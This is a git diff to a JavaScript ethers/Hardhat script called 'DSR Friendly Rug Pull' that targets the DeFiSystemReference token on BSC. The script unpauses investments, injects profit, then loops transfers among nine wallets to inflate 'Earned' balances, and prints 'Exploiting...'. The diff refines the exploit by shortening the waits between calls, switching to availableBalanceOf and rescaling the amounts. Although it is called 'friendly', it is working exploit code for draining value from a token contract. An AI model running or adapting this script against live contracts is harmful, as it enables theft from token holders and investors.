@@ -5,8 +5,9 @@ const jsonFile = fs.readFileSync(path.resolve(__dirname, "../../dsrHolders01.jso
 const networkData = JSON.parse(fs.readFileSync(path.resolve(__dirname, "../networks/bsc.json")));
 const jsonParsed = JSON.parse(jsonFile);
 const FACTOR = 10**18;
+const MIN_FACTOR = 10**8;
 const GAS_LIMIT = 12500000;
-const TIME_TO_WAIT = 15000;
+const TIME_TO_WAIT = 100;
 const PROFIT = "0.1";
 
 const main = async () => {
@@ -26,7 +27,7 @@ const main = async () => {
 
     var previousBalance = await deployer.getBalance();
 
-    // TODO: Performing friendly rug pull here
+    // Performing friendly rug pull here
     const DSR = await artifacts.readArtifact("DeFiSystemReference");
     const IUniswapV2Factory = await artifacts.readArtifact("IUniswapV2Factory");
     const dsr = new ethers.Contract(networkData.Contracts.DeFiSystemReference, DSR.abi, ethers.provider);
@@ -38,7 +39,7 @@ const main = async () => {
     var earnedAmount = 0;
     var index = 1;
     var numberOfWallets = 9;
-    const initialBalance = await dsr.balanceOf(deployer.address);
+    const initialBalance = await dsr.availableBalanceOf(deployer.address);
 
     console.log(`DSR Friendly Rug Pull`);
     console.log(`----------------------------------------------------------------------------------`);
@@ -52,16 +53,19 @@ const main = async () => {
     await dsr.connect(signer).unpauseInvestments();
     await new Promise(resolve => setTimeout(resolve, TIME_TO_WAIT));
 
-    tx = await dsr.connect(signer).transfer(wallets[index].address, ethers.utils.parseEther((initialBalance - 1).toLocaleString('fullwide', {useGrouping:false})));
+    // console.log(`Transferring ${((initialBalance - 1) / MIN_FACTOR).toFixed(0).toLocaleString('fullwide', {useGrouping:false})} DSR`);
+    tx = await dsr.connect(signer).transfer(wallets[index].address, ((initialBalance - 1) / MIN_FACTOR).toFixed(0).toLocaleString('fullwide', {useGrouping:false}));
     await new Promise(resolve => setTimeout(resolve, TIME_TO_WAIT));
-    console.log(`Starting by transferring ${((initialBalance - 1) / FACTOR).toFixed(2)} DSR from ${signer.address} to ${wallets[index].address}. Hash: ${tx.hash}`);
+    console.log(`Starting by transferring ${((initialBalance - 1) / FACTOR).toFixed(2)} DSR from ${signer._address} to ${wallets[index].address}. Hash: ${tx.hash}`);
 
     await dsr.connect(signer).receiveProfit(false, {value: ethers.utils.parseEther(PROFIT)});
     await new Promise(resolve => setTimeout(resolve, TIME_TO_WAIT));
 
     await dsr.connect(signer).transfer(wallets[index].address, 1);
-    console.log(`Transferring a little fraction of DSR from ${signer.address} to ${wallets[index].address}. Hash: ${tx.hash}`);
+    console.log(`Transferring a little fraction of DSR from ${signer._address} to ${wallets[index].address}. Hash: ${tx.hash}`);
     await new Promise(resolve => setTimeout(resolve, TIME_TO_WAIT));
+    var newBalance = await dsr.balanceOf(wallets[index].address);
+    console.log(`New Balance [${wallets[index].address}]: ${(newBalance / FACTOR).toFixed(2)}`);
     console.log(`----------------------------------------------------------------------------------`);
     console.log(`Exploiting...`);
 
@@ -69,19 +73,19 @@ const main = async () => {
         if (index > numberOfWallets)
             index = 1;
         var currentSigner = ethers.provider.getSigner(wallets[index].address);
-        earnedAmount = await dsr.balanceOf(wallets[index].address);
+        earnedAmount = await dsr.availableBalanceOf(wallets[index].address);
         var nextAddress = (index == numberOfWallets) ? wallets[1].address : wallets[++index].address;
-        tx = await dsr.connect(currentSigner).transfer(nextAddress, earnedAmount - 1);
+        tx = await dsr.connect(currentSigner).transfer(nextAddress, ((earnedAmount - 1) / MIN_FACTOR).toFixed(0).toLocaleString('fullwide', {useGrouping:false}));
         var lastHash = tx.hash;
         await new Promise(resolve => setTimeout(resolve, TIME_TO_WAIT));
 
         tx = await dsr.connect(currentSigner).transfer(nextAddress, 1);
         await new Promise(resolve => setTimeout(resolve, TIME_TO_WAIT));
-        earnedAmount = await dsr.balanceOf(nextAddress);
+        earnedAmount = await dsr.availableBalanceOf(nextAddress);
 
-        console.log(`Step ${index}`);
+        console.log(`Step #${index}`);
         console.log(`Earned ${(earnedAmount / FACTOR).toFixed(2)} DSR`);
-        console.log(`From ${currentSigner.address} to ${nextAddress}. Hashes: ${lastHash} | ${tx.hash}`);
+        console.log(`From ${currentSigner._address} to ${nextAddress}. Hashes: ${lastHash} | ${tx.hash}`);
         console.log(`-------`);
     }
 
